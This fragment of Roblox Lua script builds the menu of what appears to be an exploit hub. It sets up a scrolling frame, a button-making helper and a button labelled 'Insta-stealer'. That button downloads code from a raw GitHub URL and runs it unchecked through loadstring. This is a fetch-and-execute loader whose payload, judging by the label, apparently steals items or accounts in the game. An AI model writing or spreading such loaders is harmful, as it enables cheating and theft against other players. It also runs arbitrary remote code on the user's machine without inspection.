scroll.Size = UDim2.new(1, -10, 1, -10)
scroll.Position = UDim2.new(0, 5, 0, 5)
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.ScrollBarThickness = 6
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0

local uiList = Instance.new("UIListLayout", scroll)
uiList.Padding = UDim.new(0, 6)
uiList.SortOrder = Enum.SortOrder.LayoutOrder

uiList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
	scroll.CanvasSize = UDim2.new(0, 0, 0, uiList.AbsoluteContentSize.Y + 10)
end)

local function createUtilButton(text, color, callback)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 40)
	btn.Text = text
	btn.BackgroundColor3 = color
	btn.TextColor3 = Color3.new(1, 1, 1)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 16
	btn.BorderSizePixel = 0
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	btn.MouseEnter:Connect(function()
		btn.BackgroundColor3 = color:lerp(Color3.new(1, 1, 1), 0.2)
	end)
	btn.MouseLeave:Connect(function()
		btn.BackgroundColor3 = color
	end)

	btn.MouseButton1Click:Connect(callback)
	btn.Parent = scroll
end

createUtilButton("‚ö° Insta-stealer", Color3.fromRGB(120, 80, 200), function()
	pcall(function()
		local code = game:HttpGet("https://raw.githubusercontent.com/0ksy1/viperhub/refs/heads/main/uti")
		loadstring(code)()
	end)
end)
